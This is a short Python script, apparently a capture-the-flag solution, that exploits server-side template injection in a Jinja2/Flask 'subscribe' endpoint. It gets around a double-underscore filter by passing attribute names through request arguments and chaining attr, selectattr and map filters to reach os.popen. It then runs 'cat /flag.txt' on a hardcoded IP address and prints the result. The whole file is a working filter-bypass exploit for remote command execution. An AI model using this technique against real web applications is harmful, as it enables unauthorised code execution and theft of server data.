import requests
from bs4 import BeautifulSoup

payload = "request.__class__.__mro__.last().__subclasses__().filtermap('__init__').filtermap('__globals__').filter('popen').first()"
out = ""
args = {'us': '_'}

def add_restricted(val):
    if "__" not in val:
        args[val] = val
        return f"request.args.{val}"
    else:
        san = val.replace("__", "")
        args[san] = san
        return f"[request.args.us, request.args.us, request.args.{san}, request.args.us, request.args.us]|join"

for component in payload.split('.'):
    if component.startswith("__"):
        if component.endswith("()"):
            v = component[:-2]
            out += f"|attr({add_restricted(v)})()"
        else:
            v = component
            out += f"|attr({add_restricted(v)})"

    elif component == "last()":
        out += "|last"
    elif component == "first()":
        out += "|first"
    elif component == "list()":
        out += "|list"
    elif component.startswith("filtermap"):
        f = component[11:-2]
        req = add_restricted(f)
        out += f"|selectattr({req})|map(attribute={req})"
    elif component.startswith("filter"):
        f = component[8:-2]
        req = add_restricted(f)
        out += f"|selectattr({req})"
    else:
        out += component
args['email'] = "{% set os = " + out + "%}{{os.popen('cat /flag.txt').read()}}"
r = requests.get("http://3.23.94.118:9000/subscribe", params=args)
m = BeautifulSoup(r.text, 'lxml')
for i in m.find_all('p',{"class":"section-header"}):
	print(i.text)
